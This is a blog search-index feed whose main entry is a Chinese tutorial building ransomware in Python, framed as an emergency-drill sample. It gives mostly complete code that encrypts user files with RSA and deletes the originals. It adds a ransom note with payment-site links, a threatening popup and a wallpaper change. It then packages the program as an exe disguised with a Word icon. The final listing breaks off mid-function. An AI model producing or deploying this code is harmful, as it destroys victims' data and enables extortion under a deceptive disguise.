<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>小程序数字信封算法分析</title>
      <link href="/2024/06/12/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%B0%E5%AD%97%E4%BF%A1%E5%B0%81%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
      <url>/2024/06/12/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%B0%E5%AD%97%E4%BF%A1%E5%B0%81%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>应急演练勒索样本参考</title>
      <link href="/2024/06/06/%E5%BA%94%E6%80%A5%E6%BC%94%E7%BB%83%E5%8B%92%E7%B4%A2%E6%A0%B7%E6%9C%AC%E5%8F%82%E8%80%83/"/>
      <url>/2024/06/06/%E5%BA%94%E6%80%A5%E6%BC%94%E7%BB%83%E5%8B%92%E7%B4%A2%E6%A0%B7%E6%9C%AC%E5%8F%82%E8%80%83/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一 简介"></a>一 简介</h1><p>勒索病毒（Ransomware）确实是一种常见的网络攻击手段，它会通过加密受害者电脑上的数据来瘫痪受害者的系统，并以此勒索赎金。这种恶意软件的攻击对象可以是个人用户，也可以是企业、政府机构等。一旦数据被加密，除非支付赎金以获取解密密钥，否则这些数据将无法被正常访问。</p><p>随着互联网技术的发展和网络环境的日益复杂，网络安全问题越来越受到重视。不仅公司，包括政府和个人用户都在增强网络安全意识，采取各种措施来预防和应对勒索病毒等网络威胁。应急演练就经常遇到的一种，模拟真实的攻击场景，让团队成员在实际操作中应用应急预案，检验应对能力。</p><h1 id="二-Python实现简易勒索病毒"><a href="#二-Python实现简易勒索病毒" class="headerlink" title="二 Python实现简易勒索病毒"></a>二 Python实现简易勒索病毒</h1><h3 id="生成用于加解密的公私钥"><a href="#生成用于加解密的公私钥" class="headerlink" title="生成用于加解密的公私钥"></a>生成用于加解密的公私钥</h3><p>生成1024位 RSA公私钥 并保存为.pem，先在本地生成，将生成的公钥和加密程序一起打包发送给受害者即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 生产1024位公私钥并保存为.pem  先在本地生成，将生成的公钥和加密程序一起打包发送到受害者即可</span></span><br><span class="line">pub, priv = rsa.newkeys(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">pub = pub.save_pkcs1()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;./keys/pubkey.pem&quot;</span>, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(pub)</span><br><span class="line"></span><br><span class="line">priv = priv.save_pkcs1()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;./keys/privkey.pem&quot;</span>, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(priv)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061740163.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061740434.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061741742.png" alt="image.png"> </p><h3 id="加密文件"><a href="#加密文件" class="headerlink" title="加密文件"></a>加密文件</h3><p>1、定义要加密文件的类型</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061741086.png" alt="image.png"> </p><p>这块加密常见的几种文件类型，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#预定义想要加密的文件后缀名，可以自己选择</span><br><span class="line">target_list_str = &quot;.txt .lnk .pdf .jpg .png .jpeg .doc .docx .xls .xlsx .ppt .pptx .zip .exe&quot;</span><br></pre></td></tr></table></figure><p>2、定义函数，实现加密过程</p><p>传入需要加密的文件名，调用RSA公钥，对文件内容进行加密。</p><p>删除原始文件，并将新生成加密后的文件命名为 .enc 的后缀</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加密过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">filename</span>):</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> filename.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">1</span>] <span class="keyword">in</span> target_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./pubkey.pem&quot;</span>) <span class="keyword">as</span> file:  <span class="comment">#加载RSA公钥，准备加密</span></span><br><span class="line">            pub = file.read()</span><br><span class="line">            pub = rsa.PublicKey.load_pkcs1(pub)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 删除原始文件</span></span><br><span class="line">        os.remove(filename)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">117</span>):</span><br><span class="line">            res.append(rsa.encrypt(data[i:i + <span class="number">117</span>], pub))</span><br><span class="line">        byte_data = <span class="string">b&#x27;&#x27;</span>.join(res)</span><br><span class="line">        byte_data = base64.b64encode(byte_data).decode()</span><br><span class="line"> </span><br><span class="line">        filename = filename + <span class="string">&quot;.enc&quot;</span> <span class="comment">#加密后的文件后缀名改为.enc</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(byte_data)</span><br></pre></td></tr></table></figure><p>3、上面第二步实现的是对单个文件的加密，但一般勒索病毒，要加密实现的是全盘加密。</p><p>这块是应急演练使用，所以，一般是加密某个文件夹下的所有文件。这块就需要列出当前目录下的所有文件，循环使用rsa_encrypt函数实现文件加密</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主要作用就是列出文件夹下所有文件，实现全文件加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                encrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_encrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_encrypt(file_path)</span><br></pre></td></tr></table></figure><p>3、定义主函数main，实现对指定文件夹加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> target_list_str.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        target_list.append(i.strip())</span><br><span class="line"> </span><br><span class="line">     encrypt(<span class="string">&quot;C:\\Users\\analysis\\Desktop\\test&quot;</span>) <span class="comment">#此处自定义想要加密的目录名称</span></span><br></pre></td></tr></table></figure><p>首先创建一个测试文件夹test，里面存放一些常见的文件类型</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061742682.png" alt="image.png"> </p><p>执行脚本后，再次查看该文件夹。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061742689.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061742746.png" alt="image.png"> </p><p>到这儿，就已经实现了勒索病毒最重要的文件加密部分了。</p><h3 id="脚本优化"><a href="#脚本优化" class="headerlink" title="脚本优化"></a>脚本优化</h3><p>这块的优化，主要作用是实现一些其他的功能，让它更像真的勒索病毒。</p><p>下面是几个点优化：</p><ul><li>加密文件名默认为勒索病毒所在文件夹（这块写死是为了后续打包成exe的时候方便）</li><li>生成勒索信</li><li>直接替换受害者桌面壁纸</li><li>调用cmd弹窗，提示受害者”当前主机被勒索了”</li></ul><h4 id="指定文件夹"><a href="#指定文件夹" class="headerlink" title="指定文件夹"></a>指定文件夹</h4><p>直接调用os，python获取当前文件夹即可：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前工作目录</span></span><br><span class="line">current_directory = os.getcwd()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前工作目录是：&quot;</span>, current_directory)</span><br></pre></td></tr></table></figure><p>所以，原代码可以修改为：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061744823.png" alt="image.png"> </p><p>测试一下效果：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061744836.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061744450.png" alt="image.png"> </p><h4 id="调用Windows弹窗"><a href="#调用Windows弹窗" class="headerlink" title="调用Windows弹窗"></a>调用Windows弹窗</h4><p>可以使用tkinter模块来实现一个简单的Windows弹窗</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061747628.png" alt="image.png"> </p><p>所以，可以修改原脚本代码为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成告警弹窗</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warnning</span>():</span><br><span class="line">    <span class="comment"># 初始化Tkinter</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># 隐藏主窗口</span></span><br><span class="line">    root.withdraw()</span><br><span class="line">    <span class="comment"># 弹出消息框</span></span><br><span class="line">    messagebox.showwarning(<span class="string">&quot;Warnning!!!&quot;</span>, <span class="string">&quot;抱歉，你的电脑已经被我们控制，里面部分文件已经被加密，如果想要恢复，请及时联系我们~&quot;</span>)</span><br><span class="line">    <span class="comment"># 关闭Tkinter</span></span><br><span class="line">    root.destroy()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061747068.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061747271.png" alt="image.png"> </p><h4 id="替换桌面壁纸"><a href="#替换桌面壁纸" class="headerlink" title="替换桌面壁纸"></a>替换桌面壁纸</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> win32gui, win32con</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_wallpaper</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="comment"># SPI_SETDESKWALLPAPER = 20</span></span><br><span class="line">    <span class="comment"># SPIF_UPDATEINIFILE = 0x01</span></span><br><span class="line">    <span class="comment"># SPIF_SENDCHANGE = 0x02</span></span><br><span class="line">    <span class="comment"># 返回值：如果函数调用成功，返回值非零；如果函数调用失败，返回值为零。</span></span><br><span class="line">    <span class="comment"># 修改桌面背景</span></span><br><span class="line">    <span class="keyword">return</span> win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER,</span><br><span class="line">                                          image_path,</span><br><span class="line">                                          win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置壁纸的路径</span></span><br><span class="line">image_path = os.getcwd()+<span class="string">&quot;\\background.jpg&quot;</span></span><br><span class="line"><span class="comment"># print(image_path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数设置壁纸</span></span><br><span class="line">set_wallpaper(image_path)</span><br></pre></td></tr></table></figure><h4 id="生成勒索信"><a href="#生成勒索信" class="headerlink" title="生成勒索信"></a>生成勒索信</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件名</span></span><br><span class="line">file_name = <span class="string">&quot;extortion_Readme.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要写入的内容</span></span><br><span class="line">content = <span class="string">&quot;---=== Welcome. Again ===---\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;[+] What Happen? [+]\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;Your files are encrypted and currently unavailable. You can check it all files on the system do not open properly.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;By the way, everything is possible to recover(restore), but you need to follow our instructions. Otherwise, you can&#x27;t return your data (Never).\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;[+] What guarantees? [+]&quot;</span>\</span><br><span class="line"><span class="string">&quot;Its just a business. We absolutely do not care you and your deals, except getting benefits. If we do not do our work and liabilities - \n&quot;</span>\</span><br><span class="line"><span class="string">&quot;nobody will not cooperate with us, Its not in our interests.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;To check the ability of returning files, you should go to our website. there you can decrypt one file and free. That isi our guarantee.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the \n&quot;</span>\</span><br><span class="line"><span class="string">&quot;private key. In practice - time is much more valuable than money.\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;[+] How to get access on website? [+]\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;You have two ways:\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;1) [Recommended] Using a Tor brower!\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    a) Download and install Tor brower from this site: https://torproject.org\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    b) open our website: http://aplwbzo468w90726424023846238690283.coion/CE2937HFJJK\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;2) If Tor blocked in your country, try to use VPN! But you can use our secondary website. for this:\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    a) Open your any brower (Chrome, Opera, IE, Edge)\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    b) Open our secondary website: http://decryptor.cc/CE2937HFJJK\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;Warnning secondary website can be blocked, thats why first variant much better and more available.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;When you open our website, put the follow data in the input form:\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;Key:\n\r&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取文件的绝对路径</span></span><br><span class="line">file_path = os.path.abspath(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">os.startfile(file_path)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;文件 &#x27;<span class="subst">&#123;file_name&#125;</span>&#x27; 已创建并写入内容，现在将打开该文件.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061748593.png" alt="image.png"> </p><p>这块生成的勒索信是 txt 格式的。然而txt格式是在被加密文件类型中的。这块就会造成冲突。</p><p>所以，需要修改前面的加密函数，将 “extortion_Readme.txt” 从加密文件中排除</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主要作用就是列出文件夹下所有文件，实现全文件加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            <span class="keyword">if</span> file_name == <span class="string">&quot;extortion_Readme.txt&quot;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                encrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_encrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_encrypt(file_path)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061748290.png" alt="image.png"> </p><h3 id="代码打包成exe"><a href="#代码打包成exe" class="headerlink" title="代码打包成exe"></a>代码打包成exe</h3><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p>首先准备一个icon，用来对生成的exe伪装（这块使用word文档图标）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061749131.png" alt="img"> </p><h4 id="pyinstaller将资源文件打包到exe中"><a href="#pyinstaller将资源文件打包到exe中" class="headerlink" title="pyinstaller将资源文件打包到exe中"></a>pyinstaller将资源文件打包到exe中</h4><p>（1）首先安装pyinstaller</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure><p>（2）将资源文件打包进exe文件中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller --add-data &#x27;./res/pubkey.pem;res&#x27; --add-data &#x27;./res/background.png;res&#x27; -i .\word.ico  -Fw .\encrypt.py</span><br></pre></td></tr></table></figure><ul><li>–add-data 加载资源文件</li><li>-i   加载图标文件</li><li>-F  加载脚本文件</li><li>w：执行文件时不显示控制台</li></ul><p>同时这块要注意，确保在打包时正确引用这些资源文件。在 Python 代码中，通常使用相对路径来访问这些文件</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成资源文件目录访问路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>): <span class="comment">#是否Bundle Resource</span></span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061749643.png" alt="image.png"> </p><h4 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h4><p>打包好之后，突然想起来，生成的文件是exe格式的，那么也就需要将该文件排除在被勒索文件外：</p><p>当将Python脚本打包成可执行的exe文件后，获取自身文件名的传统方法（如使用sys.argv[0]）可能不再适用，因为打包后的exe文件可能不再直接通过Python解释器运行。</p><p>不过，可以使用os模块中的path函数来获取当前运行的exe文件的名称。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前运行的exe文件的路径</span></span><br><span class="line">exe_path = os.path.abspath(sys.executable)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取文件名</span></span><br><span class="line">exe_name = os.path.basename(exe_path)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;当前运行的exe文件名是：<span class="subst">&#123;exe_name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>脚本文件代码修改为：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061750433.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061750355.png" alt="image.png"> </p><h3 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061750849.png" alt="image.png"> </p><h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"><span class="keyword">import</span> win32gui, win32con</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 生产1024位公私钥并保存为.pem  先在本地生成，将生成的公钥和加密程序一起打包发送到受害者即可</span></span><br><span class="line"><span class="comment"># pub, priv = rsa.newkeys(1024)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pub = pub.save_pkcs1()</span></span><br><span class="line"><span class="comment"># with open(f&quot;./keys/pubkey.pem&quot;, mode=&quot;wb&quot;) as file:</span></span><br><span class="line"><span class="comment">#     file.write(pub)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># priv = priv.save_pkcs1()</span></span><br><span class="line"><span class="comment"># with open(f&quot;./keys/privkey.pem&quot;, mode=&quot;wb&quot;) as file:</span></span><br><span class="line"><span class="comment">#     file.write(priv)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#预定义想要加密的文件后缀名，可以自己选择</span></span><br><span class="line">target_list_str = <span class="string">&quot;.txt .lnk .pdf .jpg .png .jpeg .doc .docx .xls .xlsx .ppt .pptx .zip .exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成资源文件目录访问路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>): <span class="comment">#是否Bundle Resource</span></span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">filename</span>):</span><br><span class="line">    pubkey_name = resource_path(os.path.join(<span class="string">&quot;res&quot;</span>,<span class="string">&quot;pubkey.pem&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> filename.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">1</span>] <span class="keyword">in</span> target_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pubkey_name) <span class="keyword">as</span> file:  <span class="comment">#加载RSA公钥，准备加密</span></span><br><span class="line">            pub = file.read()</span><br><span class="line">            pub = rsa.PublicKey.load_pkcs1(pub)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 删除原始文件</span></span><br><span class="line">        os.remove(filename)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">117</span>):</span><br><span class="line">            res.append(rsa.encrypt(data[i:i + <span class="number">117</span>], pub))</span><br><span class="line">        byte_data = <span class="string">b&#x27;&#x27;</span>.join(res)</span><br><span class="line">        byte_data = base64.b64encode(byte_data).decode()</span><br><span class="line"> </span><br><span class="line">        filename = filename + <span class="string">&quot;.enc&quot;</span> <span class="comment">#加密后的文件后缀名改为.enc</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(byte_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要作用就是列出文件夹下所有文件，实现全文件加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            <span class="comment"># 定义排除加密的列表</span></span><br><span class="line">            <span class="keyword">if</span> file_name == <span class="string">&quot;extortion_Readme.txt&quot;</span> <span class="keyword">or</span>  file_name == <span class="string">&quot;background.png&quot;</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> file_name == exe_name:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                encrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_encrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_encrypt(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成告警弹窗</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warnning</span>():</span><br><span class="line">    <span class="comment"># 初始化Tkinter</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># 隐藏主窗口</span></span><br><span class="line">    root.withdraw()</span><br><span class="line">    <span class="comment"># 弹出消息框</span></span><br><span class="line">    messagebox.showwarning(<span class="string">&quot;Warnning!!!&quot;</span>, <span class="string">&quot;抱歉，你的电脑已经被我们控制，里面部分文件已经被加密，如果想要恢复，请及时联系我们~&quot;</span>)</span><br><span class="line">    <span class="comment"># 关闭Tkinter</span></span><br><span class="line">    root.destroy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改桌面背景</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_wallpaper</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="comment"># SPI_SETDESKWALLPAPER = 20</span></span><br><span class="line">    <span class="comment"># SPIF_UPDATEINIFILE = 0x01</span></span><br><span class="line">    <span class="comment"># SPIF_SENDCHANGE = 0x02</span></span><br><span class="line">    <span class="comment"># 返回值：如果函数调用成功，返回值非零；如果函数调用失败，返回值为零。</span></span><br><span class="line">    <span class="comment"># 修改桌面背景</span></span><br><span class="line">    <span class="keyword">return</span> win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER,</span><br><span class="line">                                          image_path,</span><br><span class="line">                                          win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_letter</span>():</span><br><span class="line">    file_name = <span class="string">&quot;extortion_Readme.txt&quot;</span></span><br><span class="line">    <span class="comment"># 要写入的内容</span></span><br><span class="line">    content = <span class="string">&quot;---=== Welcome. Again ===---\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;[+] What Happen? [+]\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Your files are encrypted and currently unavailable. You can check it all files on the system do not open properly.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;By the way, everything is possible to recover(restore), but you need to follow our instructions. Otherwise, you can&#x27;t return your data (Never).\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;[+] What guarantees? [+]&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Its just a business. We absolutely do not care you and your deals, except getting benefits. If we do not do our work and liabilities - \n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;nobody will not cooperate with us, Its not in our interests.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;To check the ability of returning files, you should go to our website. there you can decrypt one file and free. That isi our guarantee.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the \n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;private key. In practice - time is much more valuable than money.\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;[+] How to get access on website? [+]\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;You have two ways:\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;1) [Recommended] Using a Tor brower!\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    a) Download and install Tor brower from this site: https://torproject.org\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    b) open our website: http://aplwbzo468w90726424023846238690283.coion/CE2937HFJJK\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;2) If Tor blocked in your country, try to use VPN! But you can use our secondary website. for this:\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    a) Open your any brower (Chrome, Opera, IE, Edge)\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    b) Open our secondary website: http://decryptor.cc/CE2937HFJJK\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Warnning secondary website can be blocked, thats why first variant much better and more available.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;When you open our website, put the follow data in the input form:\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Key:\n\r&quot;</span></span><br><span class="line">    